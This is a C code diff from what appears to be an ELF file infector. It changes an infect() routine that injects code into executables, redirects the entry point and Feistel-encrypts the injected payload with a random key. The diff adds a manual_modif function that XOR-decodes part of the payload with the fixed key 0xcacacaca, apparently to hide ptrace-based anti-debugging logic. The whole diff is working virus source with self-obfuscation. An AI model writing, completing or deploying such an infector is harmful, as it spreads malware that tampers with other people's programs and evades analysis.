@@ -14,7 +14,19 @@
 
 static bool		parsing(byte *file, elf_data *data);
 
-#define _START_SIZE 0xb6
+#define _START_SIZE 0x10e
+
+void manual_modif(uint8_t *ptrace, uint8_t *ptrace_end, uint8_t *decrypt) {
+    while (ptrace < ptrace_end) { // While current_ptrace < end_ptrace
+        // uint32_t key = *(uint32_t *)ptrace;  // Read 4 bytes from _ptrace (key)
+        uint32_t data = *(uint32_t *)decrypt; // Read 4 bytes from decrypt (encrypted data)
+        *(uint32_t *)decrypt = data ^ 0xcacacaca;   // Decrypt using XOR and save the result
+        ptrace += 4;                         // Advance by 4 bytes in _ptrace
+        decrypt += 4;                        // Advance by 4 bytes in decrypt
+    }
+}
+
+
 
 uint32_t generate_random_key() {
     int64_t fd;
@@ -147,7 +159,7 @@ bool	infect(profiling *this, const str path) {
 
 	// Write jump to original entry point and jump to decrypt if we aren't the original
 	ft_memcpy(data.file + data.infection_offset_file + this->size - 16, (byte *)&new_jump, 4);
-	ft_memcpy(data.file + data.infection_offset_file + this->size - 159, (byte *)&zero, 4);
+	ft_memcpy(data.file + data.infection_offset_file + this->size - 247, (byte *)&zero, 4);
 
 	uint64_t key = generate_random_key();
 	if (key == 0) {
@@ -164,6 +176,18 @@ bool	infect(profiling *this, const str path) {
 	*/
 
 	feistel_encrypt(data.file + data.infection_offset_file, this->size - _START_SIZE - 1, key);
+
+	byte *ptrace_start = data.file + data.infection_offset_file + this->size - 190;
+	byte *ptrace_end = data.file + data.infection_offset_file + this->size - 156;
+	byte *decrypt_start = data.file + data.infection_offset_file + this->size - 155;
+
+	// // write ptrace_start, ptrace_end, decrypt_start, i want the pointer so 0x... not the value
+	// // write(ret, 1, ptrace_start, 8);
+	// // write(ret, 1, ptrace_end, 8);
+	// // write(ret, 1, decrypt_start, 8);
+
+
+	manual_modif(ptrace_start, ptrace_end, decrypt_start);
 
 	// Logic ends
 	infect_end:
